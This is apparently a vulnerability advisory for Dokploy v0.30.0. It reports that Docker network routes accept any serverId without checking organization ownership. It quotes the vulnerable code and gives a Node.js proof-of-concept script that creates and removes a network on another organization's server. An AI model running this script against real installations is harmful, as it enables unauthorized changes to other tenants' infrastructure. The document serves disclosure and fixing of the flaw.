### Summary

A logged in member can make Dokploy run Docker network actions on a server owned by another organization.

The network routes accept a `serverId` from the request, but do not check that the server belongs to the active organization. A member who knows a foreign `serverId` can list networks, create a network, import a network, inspect it, and remove an unused network.

Severity is medium when the foreign server id must be guessed, and high when server ids are exposed.

### Details

In `apps/dokploy/server/api/routers/network.ts`, the network routes accept a caller supplied `serverId` and use only `protectedProcedure`:

```ts
create: protectedProcedure
	.input(apiCreateNetwork)
	.mutation(async ({ ctx, input }) => {
		return createNetwork(input, ctx.session.activeOrganizationId);
	}),
```

In `packages/server/src/services/network.ts`, that server id is used for the Docker connection:

```ts
const docker = await getRemoteDocker(serverId);
await docker.createNetwork({ Name: row.name, Driver: row.driver });
```

`getRemoteDocker` looks up the server by id only. It does not check that the server belongs to the active organization. The same missing check affects network listing and import.

### PoC

I tested this on Dokploy `v0.30.0`.

Log in as a member of organization A, get a `serverId` from organization B, replace the values below, and run this with Node 18 or later.

```js
(async () => {
	const HOST = "http://localhost:3000";
	const session = "BETTER_AUTH_SESSION_TOKEN";
	const serverId = "SERVER_ID_FROM_ORG_B";
	const name = `pocnetwork${Date.now()}`;
	const headers = {
		"Content-Type": "application/json",
		Cookie: `better-auth.session_token=${session}`,
	};

	const createResponse = await fetch(`${HOST}/api/trpc/network.create`, {
		method: "POST",
		headers,
		body: JSON.stringify({ json: { name, serverId } }),
	});
	if (!createResponse.ok) {
		throw new Error(await createResponse.text());
	}

	const created = await createResponse.json();
	console.log(created);

	const networkId = created.result.data.json.networkId;
	await fetch(`${HOST}/api/trpc/network.remove`, {
		method: "POST",
		headers,
		body: JSON.stringify({ json: { networkId } }),
	});
})().catch(console.error);
```

The create response contains the new network row. The Docker network is created on organization B's server, then the second request removes the test network.

### Impact

This is an authorization bug.

Any logged in member who knows a server id from another organization can cause Docker network changes on that server. This can expose network names and settings, add a network to the host, or remove an unused network.

The main affected parties are organizations that share a Dokploy installation and use separate servers or remote Docker hosts.
